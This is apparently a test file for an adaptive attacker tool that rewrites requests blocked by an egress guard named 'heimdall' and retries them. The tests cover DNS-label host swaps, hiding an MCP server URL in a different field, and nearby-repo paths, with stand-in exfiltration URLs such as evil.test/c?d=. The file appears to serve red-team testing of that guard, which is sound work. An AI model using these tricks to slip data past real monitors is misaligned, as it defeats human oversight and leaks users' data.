"""Llama adaptive attacker: 403 reason in, one mutated retry out. Run: python3 proof/test_llama.py"""

import json
import sys

sys.path.insert(0, ".")
sys.path.insert(0, "attacks")
from llama_attacker import adapt, fallback_mutation

fails = []


def check(name, cond):
    if not cond:
        fails.append(name)


# Fallback branches (no model, no network).
m = fallback_mutation("https://evil.test/c", {"d": "x"}, None,
                      "heimdall [reviewer] unknown host needs human", "abc123")
check("unknown->dns-label", bool(m) and m["url"].startswith("https://abc123."))

# Regression: "non-allowlisted" inside a provider-fetch reason must not take
# the unknown-host branch.
m = fallback_mutation("https://api.openai.com/v1/chat/completions",
                      {"model": "m", "messages": [{"role": "user", "content": "x"}],
                       "tools": [{"type": "mcp", "server_url": "https://evil.test/c?d=Q"}]},
                      {}, "heimdall [hard-rule:provider-fetch] provider-side fetch to non-allowlisted 'evil.test'",
                      "ZZ99")
check("provider-beats-allowlist-substring", bool(m) and m["body"] is not None
      and "server_url" not in json.dumps(m["body"]))

body = {"model": "m", "messages": [{"role": "user", "content": "x"}],
        "tools": [{"type": "mcp", "server_url": "https://ci-diagnostics.test/c?d=AAA"}]}
m = fallback_mutation("https://api.openai.com/v1/chat/completions", body,
                      {"Authorization": "Bearer x"}, "heimdall [hard-rule:provider-fetch] blocked", "CANA12")
check("provider-swaps-field", bool(m) and "server_url" not in json.dumps(m["body"])
      and "ci-diagnostics.test/c" in json.dumps(m["body"]) and "CANA12" in json.dumps(m["body"]))

m = fallback_mutation("https://api.github.com/repos/me/proj/issues/1/comments", {"body": "x"}, {},
                      "heimdall [hard-rule:path] wrong repo", "c3")
check("path->nearby-repo", bool(m) and "proj-docs" in m["url"])

# adapt(): 403 triggers exactly one retry; non-403 triggers none; no LLAMA_URL => fallback.
import contextlib as _ctx
import io as _io

calls = []


def fake_send(url, body=None, headers=None):
    calls.append(url)
    return 403, "heimdall [hard-rule:dest] blocked"


with _ctx.redirect_stdout(_io.StringIO()):
    s, t, n, _ = adapt(fake_send, "A1", "post-data", "https://evil.test/c",
                    {"d": "x"}, None, 403, "unknown host", "c4")
check("adapt-retries-once", n == 1 and len(calls) == 1)

s, t, n, _ = adapt(fake_send, "A1", "x", "https://e/c", None, None, 200, "ok", "c5")
check("adapt-skips-non403", n == 0)

if fails:
    print("FAIL")
    for f in fails:
        print(f"  {f}")
    sys.exit(1)
print("ALL PASS")
